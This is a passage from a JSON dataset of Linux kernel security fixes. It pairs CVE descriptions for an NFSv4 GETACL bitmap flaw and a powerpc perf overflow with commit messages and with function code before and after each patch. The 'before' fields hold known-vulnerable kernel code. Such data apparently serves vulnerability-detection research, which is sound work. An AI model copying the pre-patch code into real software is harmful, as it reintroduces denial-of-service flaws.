                "\tfor (i = 0; i < npages; i++)",
                "\t\tif (pages[i])",
                "\t\t\t__free_page(pages[i]);",
                "\tif (args.acl_scratch)",
                "\t\t__free_page(args.acl_scratch);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/_copy_from_pages",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static void\n_copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)\n{\n\tstruct page **pgfrom;\n\tchar *vfrom;\n\tsize_t copy;\n\n\tpgfrom = pages + (pgbase >> PAGE_CACHE_SHIFT);\n\tpgbase &= ~PAGE_CACHE_MASK;\n\n\tdo {\n\t\tcopy = PAGE_CACHE_SIZE - pgbase;\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\n\t\tvfrom = kmap_atomic(*pgfrom, KM_USER0);\n\t\tmemcpy(p, vfrom + pgbase, copy);\n\t\tkunmap_atomic(vfrom, KM_USER0);\n\n\t\tpgbase += copy;\n\t\tif (pgbase == PAGE_CACHE_SIZE) {\n\t\t\tpgbase = 0;\n\t\t\tpgfrom++;\n\t\t}\n\t\tp += copy;\n\n\t} while ((len -= copy) != 0);\n}",
        "func": "void\n_copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)\n{\n\tstruct page **pgfrom;\n\tchar *vfrom;\n\tsize_t copy;\n\n\tpgfrom = pages + (pgbase >> PAGE_CACHE_SHIFT);\n\tpgbase &= ~PAGE_CACHE_MASK;\n\n\tdo {\n\t\tcopy = PAGE_CACHE_SIZE - pgbase;\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\n\t\tvfrom = kmap_atomic(*pgfrom, KM_USER0);\n\t\tmemcpy(p, vfrom + pgbase, copy);\n\t\tkunmap_atomic(vfrom, KM_USER0);\n\n\t\tpgbase += copy;\n\t\tif (pgbase == PAGE_CACHE_SIZE) {\n\t\t\tpgbase = 0;\n\t\t\tpgfrom++;\n\t\t}\n\t\tp += copy;\n\n\t} while ((len -= copy) != 0);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,4 @@\n-static void\n+void\n _copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)\n {\n \tstruct page **pgfrom;",
        "diff_line_info": {
            "deleted_lines": [
                "static void"
            ],
            "added_lines": [
                "void"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/nfs4_xdr_dec_getacl",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static int\nnfs4_xdr_dec_getacl(struct rpc_rqst *rqstp, struct xdr_stream *xdr,\n\t\t    struct nfs_getaclres *res)\n{\n\tstruct compound_hdr hdr;\n\tint status;\n\n\tstatus = decode_compound_hdr(xdr, &hdr);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_sequence(xdr, &res->seq_res, rqstp);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_putfh(xdr);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_getacl(xdr, rqstp, &res->acl_len);\n\nout:\n\treturn status;\n}",
        "func": "static int\nnfs4_xdr_dec_getacl(struct rpc_rqst *rqstp, struct xdr_stream *xdr,\n\t\t    struct nfs_getaclres *res)\n{\n\tstruct compound_hdr hdr;\n\tint status;\n\n\tstatus = decode_compound_hdr(xdr, &hdr);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_sequence(xdr, &res->seq_res, rqstp);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_putfh(xdr);\n\tif (status)\n\t\tgoto out;\n\tstatus = decode_getacl(xdr, rqstp, res);\n\nout:\n\treturn status;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,7 +14,7 @@\n \tstatus = decode_putfh(xdr);\n \tif (status)\n \t\tgoto out;\n-\tstatus = decode_getacl(xdr, rqstp, &res->acl_len);\n+\tstatus = decode_getacl(xdr, rqstp, res);\n \n out:\n \treturn status;",
        "diff_line_info": {
            "deleted_lines": [
                "\tstatus = decode_getacl(xdr, rqstp, &res->acl_len);"
            ],
            "added_lines": [
                "\tstatus = decode_getacl(xdr, rqstp, res);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/nfs4_xdr_enc_getacl",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static void nfs4_xdr_enc_getacl(struct rpc_rqst *req, struct xdr_stream *xdr,\n\t\t\t\tstruct nfs_getaclargs *args)\n{\n\tstruct compound_hdr hdr = {\n\t\t.minorversion = nfs4_xdr_minorversion(&args->seq_args),\n\t};\n\tuint32_t replen;\n\n\tencode_compound_hdr(xdr, req, &hdr);\n\tencode_sequence(xdr, &args->seq_args, &hdr);\n\tencode_putfh(xdr, args->fh, &hdr);\n\treplen = hdr.replen + op_decode_hdr_maxsz + nfs4_fattr_bitmap_maxsz + 1;\n\tencode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);\n\n\txdr_inline_pages(&req->rq_rcv_buf, replen << 2,\n\t\targs->acl_pages, args->acl_pgbase, args->acl_len);\n\tencode_nops(&hdr);\n}",
        "func": "static void nfs4_xdr_enc_getacl(struct rpc_rqst *req, struct xdr_stream *xdr,\n\t\t\t\tstruct nfs_getaclargs *args)\n{\n\tstruct compound_hdr hdr = {\n\t\t.minorversion = nfs4_xdr_minorversion(&args->seq_args),\n\t};\n\tuint32_t replen;\n\n\tencode_compound_hdr(xdr, req, &hdr);\n\tencode_sequence(xdr, &args->seq_args, &hdr);\n\tencode_putfh(xdr, args->fh, &hdr);\n\treplen = hdr.replen + op_decode_hdr_maxsz + 1;\n\tencode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);\n\n\txdr_inline_pages(&req->rq_rcv_buf, replen << 2,\n\t\targs->acl_pages, args->acl_pgbase, args->acl_len);\n\txdr_set_scratch_buffer(xdr, page_address(args->acl_scratch), PAGE_SIZE);\n\n\tencode_nops(&hdr);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,10 +9,12 @@\n \tencode_compound_hdr(xdr, req, &hdr);\n \tencode_sequence(xdr, &args->seq_args, &hdr);\n \tencode_putfh(xdr, args->fh, &hdr);\n-\treplen = hdr.replen + op_decode_hdr_maxsz + nfs4_fattr_bitmap_maxsz + 1;\n+\treplen = hdr.replen + op_decode_hdr_maxsz + 1;\n \tencode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);\n \n \txdr_inline_pages(&req->rq_rcv_buf, replen << 2,\n \t\targs->acl_pages, args->acl_pgbase, args->acl_len);\n+\txdr_set_scratch_buffer(xdr, page_address(args->acl_scratch), PAGE_SIZE);\n+\n \tencode_nops(&hdr);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\treplen = hdr.replen + op_decode_hdr_maxsz + nfs4_fattr_bitmap_maxsz + 1;"
            ],
            "added_lines": [
                "\treplen = hdr.replen + op_decode_hdr_maxsz + 1;",
                "\txdr_set_scratch_buffer(xdr, page_address(args->acl_scratch), PAGE_SIZE);",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/decode_getacl",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,\n\t\tsize_t *acl_len)\n{\n\t__be32 *savep;\n\tuint32_t attrlen,\n\t\t bitmap[3] = {0};\n\tstruct kvec *iov = req->rq_rcv_buf.head;\n\tint status;\n\n\t*acl_len = 0;\n\tif ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)\n\t\tgoto out;\n\tif ((status = decode_attr_bitmap(xdr, bitmap)) != 0)\n\t\tgoto out;\n\tif ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)\n\t\tgoto out;\n\n\tif (unlikely(bitmap[0] & (FATTR4_WORD0_ACL - 1U)))\n\t\treturn -EIO;\n\tif (likely(bitmap[0] & FATTR4_WORD0_ACL)) {\n\t\tsize_t hdrlen;\n\t\tu32 recvd;\n\n\t\t/* We ignore &savep and don't do consistency checks on\n\t\t * the attr length.  Let userspace figure it out.... */\n\t\thdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;\n\t\trecvd = req->rq_rcv_buf.len - hdrlen;\n\t\tif (attrlen > recvd) {\n\t\t\tdprintk(\"NFS: server cheating in getattr\"\n\t\t\t\t\t\" acl reply: attrlen %u > recvd %u\\n\",\n\t\t\t\t\tattrlen, recvd);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\txdr_read_pages(xdr, attrlen);\n\t\t*acl_len = attrlen;\n\t} else\n\t\tstatus = -EOPNOTSUPP;\n\nout:\n\treturn status;\n}",
        "func": "static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,\n\t\t\t struct nfs_getaclres *res)\n{\n\t__be32 *savep, *bm_p;\n\tuint32_t attrlen,\n\t\t bitmap[3] = {0};\n\tstruct kvec *iov = req->rq_rcv_buf.head;\n\tint status;\n\n\tres->acl_len = 0;\n\tif ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)\n\t\tgoto out;\n\tbm_p = xdr->p;\n\tif ((status = decode_attr_bitmap(xdr, bitmap)) != 0)\n\t\tgoto out;\n\tif ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)\n\t\tgoto out;\n\n\tif (unlikely(bitmap[0] & (FATTR4_WORD0_ACL - 1U)))\n\t\treturn -EIO;\n\tif (likely(bitmap[0] & FATTR4_WORD0_ACL)) {\n\t\tsize_t hdrlen;\n\t\tu32 recvd;\n\n\t\t/* The bitmap (xdr len + bitmaps) and the attr xdr len words\n\t\t * are stored with the acl data to handle the problem of\n\t\t * variable length bitmaps.*/\n\t\txdr->p = bm_p;\n\t\tres->acl_data_offset = be32_to_cpup(bm_p) + 2;\n\t\tres->acl_data_offset <<= 2;\n\n\t\t/* We ignore &savep and don't do consistency checks on\n\t\t * the attr length.  Let userspace figure it out.... */\n\t\thdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;\n\t\tattrlen += res->acl_data_offset;\n\t\trecvd = req->rq_rcv_buf.len - hdrlen;\n\t\tif (attrlen > recvd) {\n\t\t\tif (res->acl_flags & NFS4_ACL_LEN_REQUEST) {\n\t\t\t\t/* getxattr interface called with a NULL buf */\n\t\t\t\tres->acl_len = attrlen;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tdprintk(\"NFS: acl reply: attrlen %u > recvd %u\\n\",\n\t\t\t\t\tattrlen, recvd);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\txdr_read_pages(xdr, attrlen);\n\t\tres->acl_len = attrlen;\n\t} else\n\t\tstatus = -EOPNOTSUPP;\n\nout:\n\treturn status;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,15 +1,16 @@\n static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,\n-\t\tsize_t *acl_len)\n+\t\t\t struct nfs_getaclres *res)\n {\n-\t__be32 *savep;\n+\t__be32 *savep, *bm_p;\n \tuint32_t attrlen,\n \t\t bitmap[3] = {0};\n \tstruct kvec *iov = req->rq_rcv_buf.head;\n \tint status;\n \n-\t*acl_len = 0;\n+\tres->acl_len = 0;\n \tif ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)\n \t\tgoto out;\n+\tbm_p = xdr->p;\n \tif ((status = decode_attr_bitmap(xdr, bitmap)) != 0)\n \t\tgoto out;\n \tif ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)\n@@ -21,18 +22,30 @@\n \t\tsize_t hdrlen;\n \t\tu32 recvd;\n \n+\t\t/* The bitmap (xdr len + bitmaps) and the attr xdr len words\n+\t\t * are stored with the acl data to handle the problem of\n+\t\t * variable length bitmaps.*/\n+\t\txdr->p = bm_p;\n+\t\tres->acl_data_offset = be32_to_cpup(bm_p) + 2;\n+\t\tres->acl_data_offset <<= 2;\n+\n \t\t/* We ignore &savep and don't do consistency checks on\n \t\t * the attr length.  Let userspace figure it out.... */\n \t\thdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;\n+\t\tattrlen += res->acl_data_offset;\n \t\trecvd = req->rq_rcv_buf.len - hdrlen;\n \t\tif (attrlen > recvd) {\n-\t\t\tdprintk(\"NFS: server cheating in getattr\"\n-\t\t\t\t\t\" acl reply: attrlen %u > recvd %u\\n\",\n+\t\t\tif (res->acl_flags & NFS4_ACL_LEN_REQUEST) {\n+\t\t\t\t/* getxattr interface called with a NULL buf */\n+\t\t\t\tres->acl_len = attrlen;\n+\t\t\t\tgoto out;\n+\t\t\t}\n+\t\t\tdprintk(\"NFS: acl reply: attrlen %u > recvd %u\\n\",\n \t\t\t\t\tattrlen, recvd);\n \t\t\treturn -EINVAL;\n \t\t}\n \t\txdr_read_pages(xdr, attrlen);\n-\t\t*acl_len = attrlen;\n+\t\tres->acl_len = attrlen;\n \t} else\n \t\tstatus = -EOPNOTSUPP;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tsize_t *acl_len)",
                "\t__be32 *savep;",
                "\t*acl_len = 0;",
                "\t\t\tdprintk(\"NFS: server cheating in getattr\"",
                "\t\t\t\t\t\" acl reply: attrlen %u > recvd %u\\n\",",
                "\t\t*acl_len = attrlen;"
            ],
            "added_lines": [
                "\t\t\t struct nfs_getaclres *res)",
                "\t__be32 *savep, *bm_p;",
                "\tres->acl_len = 0;",
                "\tbm_p = xdr->p;",
                "\t\t/* The bitmap (xdr len + bitmaps) and the attr xdr len words",
                "\t\t * are stored with the acl data to handle the problem of",
                "\t\t * variable length bitmaps.*/",
                "\t\txdr->p = bm_p;",
                "\t\tres->acl_data_offset = be32_to_cpup(bm_p) + 2;",
                "\t\tres->acl_data_offset <<= 2;",
                "",
                "\t\tattrlen += res->acl_data_offset;",
                "\t\t\tif (res->acl_flags & NFS4_ACL_LEN_REQUEST) {",
                "\t\t\t\t/* getxattr interface called with a NULL buf */",
                "\t\t\t\tres->acl_len = attrlen;",
                "\t\t\t\tgoto out;",
                "\t\t\t}",
                "\t\t\tdprintk(\"NFS: acl reply: attrlen %u > recvd %u\\n\",",
                "\t\tres->acl_len = attrlen;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4611",
        "func_name": "torvalds/linux/perf_event_interrupt",
        "description": "Integer overflow in the perf_event_interrupt function in arch/powerpc/kernel/perf_event.c in the Linux kernel before 2.6.39 on powerpc platforms allows local users to cause a denial of service (unhandled performance monitor exception) via vectors that trigger certain outcomes of performance events.",
        "git_url": "https://github.com/torvalds/linux/commit/0837e3242c73566fc1c0196b4ec61779c25ffc93",
        "commit_title": "perf, powerpc: Handle events that raise an exception without overflowing",
        "commit_text": " Events on POWER7 can roll back if a speculative event doesn't eventually complete. Unfortunately in some rare cases they will raise a performance monitor exception. We need to catch this to ensure we reset the PMC. In all cases the PMC will be 256 or less cycles from overflow.  Cc: <stable@kernel.org> # as far back as it applies cleanly LKML-Reference: <20110309143842.6c22845e@kryten>",
        "func_before": "static void perf_event_interrupt(struct pt_regs *regs)\n{\n\tint i;\n\tstruct cpu_hw_events *cpuhw = &__get_cpu_var(cpu_hw_events);\n\tstruct perf_event *event;\n\tunsigned long val;\n\tint found = 0;\n\tint nmi;\n\n\tif (cpuhw->n_limited)\n\t\tfreeze_limited_counters(cpuhw, mfspr(SPRN_PMC5),\n\t\t\t\t\tmfspr(SPRN_PMC6));\n\n\tperf_read_regs(regs);\n\n\tnmi = perf_intr_is_nmi(regs);\n\tif (nmi)\n\t\tnmi_enter();\n\telse\n\t\tirq_enter();\n\n\tfor (i = 0; i < cpuhw->n_events; ++i) {\n\t\tevent = cpuhw->event[i];\n\t\tif (!event->hw.idx || is_limited_pmc(event->hw.idx))\n\t\t\tcontinue;\n\t\tval = read_pmc(event->hw.idx);\n\t\tif ((int)val < 0) {\n\t\t\t/* event has overflowed */\n\t\t\tfound = 1;\n\t\t\trecord_and_restart(event, val, regs, nmi);\n\t\t}\n\t}\n\n\t/*\n\t * In case we didn't find and reset the event that caused\n\t * the interrupt, scan all events and reset any that are\n\t * negative, to avoid getting continual interrupts.\n\t * Any that we processed in the previous loop will not be negative.\n\t */\n\tif (!found) {\n\t\tfor (i = 0; i < ppmu->n_counter; ++i) {\n\t\t\tif (is_limited_pmc(i + 1))\n\t\t\t\tcontinue;\n\t\t\tval = read_pmc(i + 1);\n\t\t\tif ((int)val < 0)\n\t\t\t\twrite_pmc(i + 1, 0);\n\t\t}\n\t}\n\n\t/*\n\t * Reset MMCR0 to its normal value.  This will set PMXE and\n\t * clear FC (freeze counters) and PMAO (perf mon alert occurred)\n\t * and thus allow interrupts to occur again.\n\t * XXX might want to use MSR.PM to keep the events frozen until\n\t * we get back out of this interrupt.\n\t */\n\twrite_mmcr0(cpuhw, cpuhw->mmcr[0]);\n\n\tif (nmi)\n\t\tnmi_exit();\n\telse\n\t\tirq_exit();\n}",
        "func": "static void perf_event_interrupt(struct pt_regs *regs)\n{\n\tint i;\n\tstruct cpu_hw_events *cpuhw = &__get_cpu_var(cpu_hw_events);\n\tstruct perf_event *event;\n\tunsigned long val;\n\tint found = 0;\n\tint nmi;\n\n\tif (cpuhw->n_limited)\n\t\tfreeze_limited_counters(cpuhw, mfspr(SPRN_PMC5),\n\t\t\t\t\tmfspr(SPRN_PMC6));\n\n\tperf_read_regs(regs);\n\n\tnmi = perf_intr_is_nmi(regs);\n\tif (nmi)\n\t\tnmi_enter();\n\telse\n\t\tirq_enter();\n\n\tfor (i = 0; i < cpuhw->n_events; ++i) {\n\t\tevent = cpuhw->event[i];\n\t\tif (!event->hw.idx || is_limited_pmc(event->hw.idx))\n\t\t\tcontinue;\n\t\tval = read_pmc(event->hw.idx);\n\t\tif ((int)val < 0) {\n\t\t\t/* event has overflowed */\n\t\t\tfound = 1;\n\t\t\trecord_and_restart(event, val, regs, nmi);\n\t\t}\n\t}\n\n\t/*\n\t * In case we didn't find and reset the event that caused\n\t * the interrupt, scan all events and reset any that are\n\t * negative, to avoid getting continual interrupts.\n\t * Any that we processed in the previous loop will not be negative.\n\t */\n\tif (!found) {\n\t\tfor (i = 0; i < ppmu->n_counter; ++i) {\n\t\t\tif (is_limited_pmc(i + 1))\n\t\t\t\tcontinue;\n\t\t\tval = read_pmc(i + 1);\n\t\t\tif (pmc_overflow(val))\n\t\t\t\twrite_pmc(i + 1, 0);\n\t\t}\n\t}\n\n\t/*\n\t * Reset MMCR0 to its normal value.  This will set PMXE and\n\t * clear FC (freeze counters) and PMAO (perf mon alert occurred)\n\t * and thus allow interrupts to occur again.\n\t * XXX might want to use MSR.PM to keep the events frozen until\n\t * we get back out of this interrupt.\n\t */\n\twrite_mmcr0(cpuhw, cpuhw->mmcr[0]);\n\n\tif (nmi)\n\t\tnmi_exit();\n\telse\n\t\tirq_exit();\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -42,7 +42,7 @@\n \t\t\tif (is_limited_pmc(i + 1))\n \t\t\t\tcontinue;\n \t\t\tval = read_pmc(i + 1);\n-\t\t\tif ((int)val < 0)\n+\t\t\tif (pmc_overflow(val))\n \t\t\t\twrite_pmc(i + 1, 0);\n \t\t}\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tif ((int)val < 0)"
            ],
            "added_lines": [
                "\t\t\tif (pmc_overflow(val))"
            ]
        }
    }
]